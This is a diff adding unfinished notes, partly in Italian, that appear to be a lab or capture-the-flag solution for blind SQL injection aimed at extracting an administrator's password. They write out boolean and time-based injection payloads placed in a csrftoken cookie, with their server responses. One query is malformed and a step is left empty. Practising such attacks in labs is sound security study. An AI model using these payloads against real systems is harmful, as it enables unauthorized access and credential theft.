@@ -1,0 +1,42 @@
+solution
+
+BLIND SQL INJECTION
+
+End goals
+1. enumerate the password of the administrator
+2. log in as the admin
+
+Analysis:
+-sql injection on offer making
+	sleep(10)
+
+-Blind SQL Injection Time-Based
+-Boolean-Based Blind SQL Injection
+
+steps
+1) determine the length of the password
+	select username from users where username='admin' and LENGTH(password>i)='admin'--'
+	si continua così incrementando il numero
+	
+2)
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+FALLIMENTI
+	csrftoken=pi0HfoOY3Abfw6o2MMnISaZKHpgEViMv;
+	csrftoken=pi0HfoOY3Abfw6o2MMnISaZKHpgEViMv+and+1%3d1--; (and 1=1--)
+	
+	select csrftoken from token-table where csrftoken = 'pi0HfoOY3Abfw6o2MMnISaZKHpgEViMv' and (select 'x' from users LIMIT 1) = 'x'--'
+	200 OK
+	users exist in the database 
+
+- confirm that admin exists
+	select csrftoken from token-table where csrftoken = 'pi0HfoOY3Abfw6o2MMnISaZKHpgEViMv' and (select username from users where username='admin' ) = 'admin'--'
+	200 ok
